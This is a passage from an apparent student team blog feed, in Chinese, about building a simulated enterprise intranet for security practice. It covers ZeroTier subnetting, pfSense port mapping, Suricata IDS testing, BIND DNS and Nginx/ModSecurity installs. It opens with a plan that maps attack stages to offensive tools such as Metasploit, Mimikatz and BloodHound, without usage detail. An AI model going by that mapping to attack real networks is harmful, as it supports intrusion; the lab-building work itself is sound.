href="https://attack.mitre.org/tactics/TA0040">https://attack.mitre.org/tactics/TA0040</a></td><td>Impact</td><td>The adversary is trying to manipulate, interrupt, or destroy your systems and data.</td></tr></tbody></table><p>根据ATT&amp;CK的渗透战术，我们制定了基本的渗透攻击框架：</p><table><thead><tr><th>步骤</th><th>具体执行</th><th>渗透工具集</th></tr></thead><tbody><tr><td>侦查+资源准备</td><td>信息收集与攻击准备（如注册账号、了解功能）、账户凭证</td><td>theHarvester、Shodan、Recon-ng、Google Hacking Database</td></tr><tr><td>接入网络+执行攻击</td><td>初次进入网络、执行恶意代码</td><td>Metasploit、Empire</td></tr><tr><td>持久化+防检测</td><td>将恶意攻击持久化</td><td>Mimikatz、PowerSploit、Gsecdump、Pwdump</td></tr><tr><td>提权</td><td>提高用户权限</td><td>PowerUp、Incognito、Windows Exploit Suggester、JAWS</td></tr><tr><td>窃取数据</td><td>窃取用户名与密码</td><td>Responder、Wireshark、Tcpdump、Ettercap</td></tr><tr><td>环境发现+横向渗透</td><td>挖掘环境、横向移动</td><td>BloodHound、CrackMapExec、Empire、Metasploit</td></tr></tbody></table><p>这些工具集还未具体测试，之后会逐个测试，构建渗透战术与流程。</p>]]></content>
      
      
      <categories>
          
          <category> environment </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>企业内网模拟靶场搭建2_环境搭建</title>
      <link href="/2023/03/20/%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E6%A8%A1%E6%8B%9F%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA2_%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/03/20/%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E6%A8%A1%E6%8B%9F%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA2_%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="企业内网模拟靶场搭建2-环境搭建"><a href="#企业内网模拟靶场搭建2-环境搭建" class="headerlink" title="企业内网模拟靶场搭建2_环境搭建"></a>企业内网模拟靶场搭建2_环境搭建</h1><p>本文旨在对企业内网搭建的模块进行划分，并给出完整的规划情况和调研所得的技术栈，汇报共7轮，于16周内完成。</p><p>组长：鲁昊朗</p><p>小组成员：刘奇、彭竑睿、时钰铎、周椿林</p><p>汇报时间：2023年3月20日</p><h2 id="一、针对网络拓扑的优化与修改"><a href="#一、针对网络拓扑的优化与修改" class="headerlink" title="一、针对网络拓扑的优化与修改"></a>一、针对网络拓扑的优化与修改</h2><p>针对网络拓扑，在实际搭建过程中，我们进行了优化，并分配了IP地址：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318165056455.png" alt="image-20230318142816273"></p><p>网络拓扑图有以下改动：</p><ul><li><strong>取消子网边界的多余的防火墙</strong>：子网内部设置过多防火墙会进行重复、赘余的检查，降低网络效率；</li><li><strong>取消数据中心区的设置</strong>：我们曾经错误的认为DMZ-WEB服务器的数据库应该放置在核心内网中隔离，但是实际上并不需要，如果那样部署反而会引起黑客入侵内网；</li><li><strong>优化了IPS的连接方式</strong>：由于DMZ区的web、邮件服务器均已经收到来自网络层的边界fw和来自网络层的WAF的保护，在其中再架设IPS就会增大IPS的负载，故IPS只用来保护核心内网的主机；</li></ul><p>于此同时，我们对内网中每一个终端（虚拟终端）的IP地址进行了计划.</p><h2 id="二、针对组网技术的调研"><a href="#二、针对组网技术的调研" class="headerlink" title="二、针对组网技术的调研"></a>二、针对组网技术的调研</h2><h3 id="1-使用云服务技术进行虚拟组网"><a href="#1-使用云服务技术进行虚拟组网" class="headerlink" title="1. 使用云服务技术进行虚拟组网"></a>1. 使用云服务技术进行虚拟组网</h3><p>​    在前期调研中，我们提到使用Openstack、StarVcenter等工具，完成完整网络拓扑的构建（即使用云服务模拟网络架构的功能，模拟整个网络），该方案具有一定的可行性，如openstack提供了基于网络拓扑的配置的单独界面：</p><p><img src="https://img-blog.csdnimg.cn/ed0f71e6db464aca9400ad5eb74fb641.png" alt="img"></p><p>然而，Openstack具有如下的不可行性：</p><ul><li>所需要的硬件资源庞大，单独电脑无法承受其带来的负载，增添节点后，又会增加部署和环境的复杂度</li><li>本身作为云服务部署在虚拟机上，在上面再进行云服务的嵌套，层数太多，消耗性能</li><li>配置网络内容时，更多的使用web页面提供的集成功能，而不是手动进行web配置</li><li>软件体系过大，导致更多的困难集中于对于拓扑的部署，而不是对于主题安全防护设备本身的思考</li></ul><p>综合以上原因，虽然我们在上一周已经对云服务进行了初步的尝试和配置，最终选择放弃这一方案。</p><h3 id="2-使用拓扑软件的思路"><a href="#2-使用拓扑软件的思路" class="headerlink" title="2. 使用拓扑软件的思路"></a>2. 使用拓扑软件的思路</h3><p>​    eNSP是华为的一个网络模拟器，借助这个模拟器，可以模拟网络架构和建设，在其中，我们可以进行较为复杂的网络配置的工作，同时，由于ensp还支持虚拟机，也就是cloud的接入，可以在不搭建云服务的情况下实现较为完整的网络拓扑。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318172746303.png" alt="image-20230318164008869"></p><p>eNSP的优点：</p><ul><li>其中的网络设备（如路由器）均可以使用等同于现实的命令行进行配置，帮助了解网络配置步骤：</li></ul><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318172558600.png" alt="image-20230318165056455" style="zoom: 67%;" /><ul><li>可以配置较为复杂的网络拓扑，并通过cloud接入本地虚拟机</li></ul><p>之所以不选择ensp的原因:</p><ul><li>eNSP连入的本地虚拟机需要同时启动，没有能装得下那么多虚拟机的系统，如果只启动一部分虚拟机都不太方便</li><li>单机配置环境，若多机配置，需要迁移虚拟机，面临网络配置、虚拟机版本问题，不利于团队协作</li></ul><h3 id="3-zerotier调研使用情况"><a href="#3-zerotier调研使用情况" class="headerlink" title="3. zerotier调研使用情况"></a>3. zerotier调研使用情况</h3><p>​    zerotier是一个组网工具，支持windows、linux、freeBSD多种操作系统。在对应主机上安装软件后，可以为多个能够连接公网的物理\虚拟设备分配ip地址，进行虚拟组网，使他们在逻辑上处于一个虚拟局域网中，首先在注册后创建一个网络：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318174948459.png" alt="image-20230318172558600"></p><p>​    通过该网络独有的网络IP，即NETWORK ID加入网络：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318142816273.png" alt="image-20230318172746303"></p><p>​    如上所示，该虚拟局域网中有9台主机加入，并分别分配了IP，形成如下拓扑</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318164008869.png" alt="image-20230318173058248" style="zoom: 50%;" /><p>​    其中，被圈中的三个节点为同一台主机，并按照ip分发网络拓扑配置。实现在192.168.0.0/16的大内网下，分别划分192.168.10.0/24和192.168.11.0/24两个子网，并通过被圈起的，也就是列表中的kali主机进行流量的转发工作（为了实验，暂时使用此系统）。</p><p>​    然而，zerotier并没有实现内网的划分功能：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319143823012.png" alt="image-20230318173440005" style="zoom:80%;" /><p>​    如图，指定LAN地址为192.168.0.0/16，zerotier所支持的，就是在词虚拟局域网LAN和其他网段之间构建路由，并添加via。如<code>ip route add 192.168.0.0/24 via 192.168.1.2</code>就表示，要进入192.168.0.0/24网段，需要经过入口主机也就是192.168.1.2主机。</p><p>​    这一方式，实现网段划分的问题是，要进行网段逻辑上的分离需要创建多个zerotier网络，这和内网实际不是非常相似（企业的内网也应该是通过在大内网中划分小网段的方式实现的）。</p><p>​    经过研究，我们提出了另一种划分子网的方式，即通过flow rules划分：</p><p>如下，可实现不同网段的隔离：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">accept ipdest 192.168.10.0/24 and ipsrc 192.168.10.0/24;</span><br><span class="line">accept ipdest 192.168.11.0/24 and ipsrc 192.168.11.0/24;</span><br><span class="line"></span><br><span class="line">drop;</span><br></pre></td></tr></table></figure><p>如下，可手动实现redirect，这一功能可将网络中指定ID号的主机设置为网关主机。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318173440005.png" alt="image-20230318174948459"></p><p>通过flow rules配置，就可以满足内网划分子网模拟的需要。</p><h2 id="三、针对网络内部主机（组件）的配置"><a href="#三、针对网络内部主机（组件）的配置" class="headerlink" title="三、针对网络内部主机（组件）的配置"></a>三、针对网络内部主机（组件）的配置</h2><p>​    我们对网络中各个组件（也就是终端）进行了分模块的部署工作。</p><h3 id="0-网络入口"><a href="#0-网络入口" class="headerlink" title="0.网络入口"></a>0.网络入口</h3><h4 id="pfSense入口FW"><a href="#pfSense入口FW" class="headerlink" title="pfSense入口FW"></a>pfSense入口FW</h4><h5 id="pfSense概况"><a href="#pfSense概况" class="headerlink" title="pfSense概况"></a>pfSense概况</h5><p>​    pfSense是一款基于FreeBSD操作系统的免费开源防火墙和路由器软件。它提供了许多功能，例如虚拟专用网络（VPN）功能，负载平衡，网络地址转换（NAT），DHCP服务，域名系统（DNS）服务，以及其他网络安全和路由功能。通过官网教程，可在vm workstatio对该系统进行安装：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319173726373.png" alt="image-20230319143823012" style="zoom: 80%;" /><p>​    如上所示，pfsense系统需要wan、lan两个网段分别对应企业架构中的外网和内网，对应的，也需要添加两张网卡。在option中的1、2可以分别指定不同网段对应的网卡（也就是选择那张网卡对应lan、哪个对应wan）和某一网卡的IP配置情况（等同于linux的/etc/sysconfig/network-script目录下的配置）。而后，在Lan，也就是内网可访问到pfsense的webUI界面，或使用sshshell或本机shell对其进行操作：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319173806702.png" alt="image-20230319144214374" style="zoom: 50%;" /><p>​    如图，web界面中，每一个选项的功能如下：</p><ol><li><strong>Interfaces</strong>：配置接口类型、IP地址、子网掩码、MTU（最大传输单元）等。</li><li><strong>Firewall</strong>：配置pfSense的防火墙规则，包括入站、出站和NAT规则</li><li><strong>Services</strong>：配置pfSense提供的服务，例如DHCP、DNS、NTP等。</li><li><strong>VPN</strong>：可以配置OpenVPN和IPsec等。</li><li><strong>Status</strong>：此页面提供了系统状态和事件日志的信息，包括接口状态、系统日志、DHCP租赁信息等，当出现错误时，可以在此处找到历史流量的记录。</li><li><strong>Diagnostics</strong>：此页面提供了一些诊断工具，例如ping、traceroute、nslookup等。用户可以使用这些工具来测试网络连接和解决故障。</li></ol><h5 id="nat策略"><a href="#nat策略" class="headerlink" title="nat策略"></a>nat策略</h5><p>多种NAT技术：</p><blockquote><ul><li>端口转发：将外部网络请求转发到内部网络的指定主机和端口，从而实现内部网络主机的对外服务。如，将外部网络对公共IP地址的80端口请求转发到内部网络的某个主机的8080端口；</li><li>地址转换：NAT设备将内部网络的私有IP地址转换为外部网络的公共IP地址，从而实现内部网络主机的访问外部网络；</li><li>端口映射：NAT设备将外部网络请求映射到内部网络的不同端口，从而实现内部网络主机的对外服务，但是映射后的端口与内部网络的原始端口不同。</li></ul></blockquote><p><strong>端口映射&amp;端口转发</strong></p><p>​    查了很多资料，最后得出的结论就是：<strong>端口映射和端口转发的区别在于数据包的源IP地址和端口是否被修改，修改了，则是端口转发；反之，则是映射。</strong></p><p>​    在端口映射中，数据包的源IP地址和端口不会被修改，内网主机接收到的数据包的源IP地址和端口与外部用户发送的数据包的源IP地址和端口相同。内网主机响应该请求时，将响应数据包发送回路由器或防火墙。路由器或防火墙会将目的IP地址和端口修改为外部用户的IP地址和端口，然后将响应数据包发送给外部用户。数据包只需要经过一次NAT转换。</p><p>​    在端口转发中，外部用户向路由器或防火墙的公共IP地址和转发的端口发送数据包时，数据包的目的IP地址和端口会被修改为内网主机的IP地址和端口。内网主机接收到的数据包的源IP地址和端口与外部用户发送的数据包的源IP地址和端口不同，内网主机响应该请求时，将响应数据包发送回路由器或防火墙。路由器或防火墙会将源IP地址和端口修改为公共IP地址和转发的端口，然后将响应数据包发送给外部用户。因此，在端口转发中，数据包的目的IP地址和端口会被修改，数据包需要经过两次NAT转换。</p><p>​    在端口映射中，由于映射的端口与内部网络的原始端口不同，因此在内部网络中的主机向外部网络发送响应数据包时，这些数据包需要经过路由器或防火墙的处理，并且源地址和端口需要正确地映射为公共IP地址和映射的端口，才能被正确返回。因此，在端口映射中需要回流规则来确保响应数据包能够正确返回。端口转发中，公共IP地址和端口直接映射到内部网络中的主机和端口，返回的数据包是直接从目标主机返回到客户端，没有经过路由器或防火墙的再次处理，因此不存在回流问题，不需要设置回流规则。</p><p>​    最终实际使用的技术是<strong>端口映射</strong>。</p><h5 id="实际配置过程："><a href="#实际配置过程：" class="headerlink" title="实际配置过程："></a>实际配置过程：</h5><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318141013748.png" alt="image-20230319173726373"></p><p>配置端口映射策略，得到如下规则：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319220531210.png" alt="image-20230319173806702"></p><p>将来自外网针对边界防火墙的8081端口的请求，映射到内网192.168.152.100主机的80端口。</p><p>过程中遇到的问题：</p><p>问题一：未关闭针对私有地址回流的屏蔽，两个内网网段无法通信。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319144214374.png" alt="image-20230318141013748"></p><p>问题二：未启用NAT回流</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319180720377.png" alt="image-20230319180720377"></p><p>问题三：经过一系列正确配置后，未将pfsense防火墙主机设置为被保护主机的网关，被保护主机默认将数据包返回到vmware网关，故无法正确进行数据包的返回。</p><h4 id="suricata"><a href="#suricata" class="headerlink" title="suricata"></a>suricata</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>​    <strong>Suricata</strong>是一个免费、开源、成熟、快速、健壮的网络威胁检测引擎。Suricata引擎能够进行实时入侵检测(IDS)、入侵防御系统(IPS)和离线pcap处理。Suricata使用强大而广泛的规则和签名语言来检查网络流量，并提供强大的Lua脚本支持来检测复杂的威胁。使用标准的输入和输出格式(如YAML和JSON)，使用现有的SIEMs、Splunk、Logstash/Elasticsearch、Kibana和其他数据库等工具进行集成将变得非常简单。</p><blockquote><ol><li>SIEMs（Security Information and Event Management）：是一种集成了安全信息管理和安全事件管理的综合性安全系统，可以对安全事件进行实时监控、检测和响应，并提供事件管理、日志管理、威胁情报和风险评估等功能。常见的SIEM产品包括IBM QRadar、Splunk Enterprise Security、LogRhythm等。</li><li>Splunk：是一种用于实时日志管理和分析的软件，可以从各种数据源中收集、存储和分析数据，并提供数据可视化、报告和警报等功能，可广泛应用于IT运维、安全事件响应等领域。</li><li>Logstash/Elasticsearch：Logstash是一种数据采集和处理工具，可以将来自各种数据源的数据进行采集、处理和转换，最终将数据存储到Elasticsearch中。Elasticsearch是一种开源搜索引擎，用于存储、搜索和分析各种类型的数据。Logstash和Elasticsearch通常一起使用，形成一种日志管理和分析系统。</li><li>Kibana：是一种开源数据可视化工具，与Elasticsearch紧密集成，可以对Elasticsearch中的数据进行实时查询和分析，并生成各种类型的数据可视化图表和报告。Kibana通常用于IT运维、日志分析和安全事件响应等领域。</li></ol><p>注：生成自chatgpt</p></blockquote><p>三种运行模式：</p><p>​    网关模式：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319203709319.png" alt="image-20230319220442749" style="zoom: 33%;" /><p>​    主机模式：</p><p><img src="https://upload-images.jianshu.io/upload_images/6201627-7e583cbd133ae5b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/378/format/webp" alt="img"></p><p>​    旁路模式：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319203507239.png" alt="image-20230319220531210" style="zoom: 80%;" /><h5 id="安装-amp-配置"><a href="#安装-amp-配置" class="headerlink" title="安装&amp;配置"></a>安装&amp;配置</h5><ul><li>系统：CentOS 7</li></ul><p>我们在CentOS 上安装的是 Suricata 6.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release yum-plugin-copr</span><br><span class="line">yum copr enable @oisf/suricata-6.0</span><br><span class="line">yum install suricata</span><br></pre></td></tr></table></figure><p>安装后可以通过 <code>suricata</code>查看</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319203607817.png" alt="image-20230319203424354" style="zoom: 50%;" /><p>基本使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">目录：</span><br><span class="line">/etc/suricata/存放suricata执行和配置文件的目录</span><br><span class="line">/etc/suricata/rules规则文件存放目录，自己之后写的也要放在这里</span><br><span class="line">/var/log/suricata/存放suricata日志的目录</span><br><span class="line">/var/lib/suricata/rules 更新的配置文件</span><br><span class="line"></span><br><span class="line">//官方更新的rule规则,更新的配置文件存放在`/var/lib/suricata/rules`中,文件为classification.config和`suricata.rules`,需要`cp`至`/etc/suricata/rules`中才能加载成功,不然可能会有错误</span><br><span class="line"></span><br><span class="line">文件：</span><br><span class="line">suricata.yamlsuricata的配置文件，重中之重，特别重要，位于/etc/suricata/下</span><br><span class="line">suricata.rules官方规则文件，存放在/etc/suricata/rules中</span><br><span class="line">fast.log警告日志文件，存放在/var/log/suricata/下，匹配的输出都在这里</span><br><span class="line"></span><br><span class="line">启动 suricata -c /etc/suricata/suricata.yaml -i ens32</span><br><span class="line">查看日志 vi /var/log/suricata/fast.log</span><br></pre></td></tr></table></figure><p>简单测试：</p><p>这里，我们先对<code> /etc/suricata/suricata.yaml</code>文件开头的<code>HOME_NET</code>和<code>EXTERNAL_NET</code>进行设置</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319220442749.png" alt="image-20230319203507239" style="zoom:50%;" /><p>然后，修改<code>suricata.yaml</code>中最后配置中的默认规则文件<code>rule-files</code>，将其修改为自己的<code>test-rules</code>文件，对了，这里记得将默认的路径修改为<code>/etc/suricata/rules</code>，这个路径下全部都是suricata的规则文件，我们自己写的<code>test-rules</code>也是放在这个文件路径下的。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319203636234.png" alt="image-20230319203530494" style="zoom: 50%;" /><p>然后，编辑<code>test-rules</code>，加入百度触发规则<code>alert http any any -&gt; any any (msg:&quot;hit baidu.com...&quot;;content:&quot;baidu&quot;; reference:url, www.baidu.com;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319212643244.png" alt="image-20230319203607817">使用<code>ifconfig ens32 promisc</code>将<code>ens32</code>网卡设置为混杂模式，接收网络中的数据包：</p><blockquote><p>网卡的混杂模式（Promiscuous mode）是指网卡可以接收到所有经过它的网络流量，包括那些不是发送给它的数据包。通常情况下，网卡只会接收那些目标地址是它自己或者广播地址的数据包，而忽略其他的数据包，这样可以避免网络拥塞和减轻网卡的工作负担。但是，在某些情况下，需要使用网卡的混杂模式，例如网络分析、数据包捕获、入侵检测等。</p></blockquote><p> <img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319130003309.png" alt="image-20230319203636234">如果这里显示CentOS上没有安装<code>ifconfig</code>，可以使用指令<code>yum install net-tools.x86_64 -y</code>进行安装</p><p>然后，执行<code>suricata -c /etc/suricata/suricata.yaml -i ens32</code>启动<code>suricata</code>，进行对<code>ens32</code>网卡的网络检测，</p><p>并且开启处于同一网段下的另一台CentOS主机<code>192.168.215.136</code>，通过<code>curl http://www.baidu.com</code>访问百度页面</p><p>然后，<code>suricata主机</code>执行<code> vi /var/log/suricata/fast.log</code>查看日志信息，这里就可以看到另一主机访问百度的信息，</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230318173058248.png" alt="image-20230319203709319">这表明，我们成功使用<code>suricata</code>对<code>192.168.215.0/24</code>网段下的网络流量进行了监测行为。</p><h3 id="1-DMZ区"><a href="#1-DMZ区" class="headerlink" title="1.DMZ区"></a>1.DMZ区</h3><h4 id="bind-DNS服务器"><a href="#bind-DNS服务器" class="headerlink" title="bind DNS服务器"></a>bind DNS服务器</h4><h5 id="DNS-概况"><a href="#DNS-概况" class="headerlink" title="DNS-概况"></a>DNS-概况</h5><p><strong>Bind简介</strong>：</p><p>​    <strong>BIND</strong>（Berkeley Internet Name Domain）作为一款目前市面是最主流的开源DNS软件，占据了市面上DNS服务器软件的九成，目前由 互联网系统协会 (Internet Systems Consortium) 负责开发和维护。目前，最新的稳定版BIND已经更新到了 BIND 9 版本。</p><p><strong>本地部署环境：</strong></p><p>​    Dns服务器：ubuntu20 bind9</p><p>​    Dns客户端：ubuntu20</p><h5 id="DNS-企业为什么要搭建DNS服务器？"><a href="#DNS-企业为什么要搭建DNS服务器？" class="headerlink" title="DNS-企业为什么要搭建DNS服务器？"></a>DNS-企业为什么要搭建DNS服务器？</h5><p>参考博客：<a href="https://www.bbsmax.com/A/Vx5MZoZ9dN/">https://www.bbsmax.com/A/Vx5MZoZ9dN/</a></p><p>​    DNS服务器的最主要功能用于提供对应服务器的FQDN（Fully qualified domain name），既然使用互联网上的DNS服务器就可以解析全球域名，为何还要自掏腰包搭建DNS服务器呢？有2点原因：</p><blockquote><p><strong>完全限定域名</strong>（英语：Fully qualified domain name），缩写为FQDN，又译为<strong>完全资格域名</strong>、<strong>完整领域名称</strong>，又称为<strong>绝对领域名称</strong>（absolute domain name）、 <strong>绝对域名</strong>，<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D?fromModule=lemma_inlink">域名</a>的一种，能指定其在<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F?fromModule=lemma_inlink">域名系统</a> (DNS) 树状图下的一个确实位置。</p><p>完整域名由主机名称与母域名两部分所组成，例如有一部服务器的本地主机名为myhost，而其母域名为example.com，那指向该服务器的完整域名就是myhost.example.com。虽然世界上可能有很多服务器的本地主机名是myhost，但myhost.example.com是唯一的，因此完整域名能识别该特定服务器。</p></blockquote><p>① 解析内网服务器域名<br>② 降低内网域名解析流量</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319203424354.png" alt="image-20230319130003309" style="zoom:80%;" /><p>​    在BUPT域名下，有很多域名，如jwgl.bupt.deu.cn是不提供给公网上的用户访问的，只提供内网用户人员进行访问，此时，这些域名未向相关机构进行注册，也就无法被互联网的DNS服务器解析。如上图所示校内ftp服务器的FQDN就是ftp.bupt.edu.cn，其他服务器类似。企业内部计算机访问ftp的时候就会被DNS解析成内网的IP（内网的IP都是私网IP，指望互联网上DNS是不可能解析出来的）。对于非内网的域名，比如<a href="http://www.baidu.com,内网dns自己解析不出来就寻求互联网上的根dns服务器,后面过程就是标准dns递归解析流程了./">www.baidu.com，内网DNS自己解析不出来就寻求互联网上的根DNS服务器，后面过程就是标准DNS递归解析流程了。</a></p><p>​    与此同时，若企业内部没有DNS服务器，所有客户上网都是用互联网上的DNS服务器。以上百度为例，所有客户机都需要缓存一份到百度的域名解析记录。这无疑是很浪费资源的，同时企业中计算机较为庞大，每个人都有域名解析需求，必然会消耗企业到互联网之间宝贵的带宽。在企业内网引入一个DNS服务器，企业计算机的DNS都指向该内网DNS服务器，对于外网的域名，只需要内网DNS服务器解析缓存一次即可，内网计算机的域名解析流量被拦截在了内网。</p><p>​    使用内网DNS服务器还有个好处，就是可以限制内网客户机上网。在公司内部，需要对一些一致的恶意域名和与办公无关的域名进行屏蔽，如在内网DNS上把淘宝的域名屏蔽掉，内网客户机就不能访问淘宝了。当然如果内网主机能够使用互联网上的DNS照样能够访问淘宝，但是，如果企业继续在内网到外网的出口路由器（防火墙）进行对于dns协议的屏蔽策略，在出口路由器那里设置只允许内网DNS服务器的ip地址通过dns协议访问Internet，就能实现对于内网域名解析的限制。</p><h5 id="DNS-配置"><a href="#DNS-配置" class="headerlink" title="DNS-配置"></a>DNS-配置</h5><p>​    实验目的：服务器和客户端在同一网段（可互相ping通），通过手动配置dns客户端dns服务器地址。实现局域网内终端机dns正向解析、逆向解析和域名屏蔽。（说明：因为当前架构较小，没有考虑设置出于完备性的从属dns服务器作为备份）</p><p><strong>配置文件</strong></p><p>​    Bind需要配置的文件有这么几个</p><ul><li>named.conf <ul><li>全局设置<br> <img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></li></ul></li></ul><p>​    一般的全局设置放在了named.conf.options中，这里的named.conf仅用作域名屏蔽。</p><ul><li><p>named.conf.options </p><ul><li>全局设置选项（实际上效果和named.conf能够平替）<br> <img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></li></ul></li><li><p>named.conf.local</p><ul><li>zones解析文件的引导文件<br> <img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></li></ul></li></ul><p>上面每个域的解析文件分别如下</p><ul><li><p>nyc3.example.com（正向解析表）<br> <img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></p></li><li><p>122.10.in-addr.arpa（逆向解析表）<br> <img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></p></li></ul><p><strong>dns正向解析效果：</strong></p><p><img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png" alt="img"></p><p><strong>dns逆向解析效果：</strong></p><p><img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg" alt="img"></p><p><strong>域名屏蔽效果：</strong></p><p><img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image015.jpg" alt="img"></p><p>作为对比，访问淘宝网站时正常：</p><p><img src="file:///C:/Users/86183/AppData/Local/Temp/msohtmlclip1/01/clip_image017.jpg" alt="img"></p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319173637931.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319173637931.png"></p><p><a href="http://nginx.org/en/linux_packages.html#mainline">http://nginx.org/en/linux_packages.html#mainline</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">To set up the apt repository for stable nginx packages, run the following command:</span><br><span class="line"></span><br><span class="line">echo &quot;deb [signed-by=/usr/share/keyrings/nginx-archive-keyring.gpg] \\</span><br><span class="line">&lt;http://nginx.org/packages/ubuntu&gt; `lsb_release -cs` nginx&quot; \\</span><br><span class="line">    | sudo tee /etc/apt/sources.list.d/nginx.list</span><br><span class="line">If you would like to use mainline nginx packages, run the following command instead:</span><br><span class="line"></span><br><span class="line">echo &quot;deb [signed-by=/usr/share/keyrings/nginx-archive-keyring.gpg] \\</span><br><span class="line">&lt;http://nginx.org/packages/mainline/ubuntu&gt; `lsb_release -cs` nginx&quot; \\</span><br><span class="line">    | sudo tee /etc/apt/sources.list.d/nginx.list</span><br><span class="line">Set up repository pinning to prefer our packages over distribution-provided ones:</span><br><span class="line"></span><br><span class="line">echo -e &quot;Package: *\\nPin: origin nginx.org\\nPin: release o=nginx\\nPin-Priority: 900\\n&quot; \\</span><br><span class="line">    | sudo tee /etc/apt/preferences.d/99nginx</span><br><span class="line">To install nginx, run the following commands:</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><h4 id="Modsecurity"><a href="#Modsecurity" class="headerlink" title="Modsecurity"></a>Modsecurity</h4><h5 id="Modsecurity安装"><a href="#Modsecurity安装" class="headerlink" title="Modsecurity安装"></a>Modsecurity安装</h5><p><strong>安装依赖</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ yum install -y wget epel-release gcc-c++ flex bison yajl yajl-devel curl-devel curl GeoIP-devel doxygen zlib-devel pcre-devel lmdb-devel libxml2-devel ssdeep-devel lua-devel libtool autoconf automake</span><br><span class="line">$ wget &lt;https://github.com/maxmind/libmaxminddb/releases/download/1.6.0/libmaxminddb-1.6.0.tar.gz&gt;</span><br><span class="line">$ tar -zxvf libmaxminddb-1.6.0.tar.gz</span><br><span class="line">$ cd libmaxminddb-1.6.0</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span 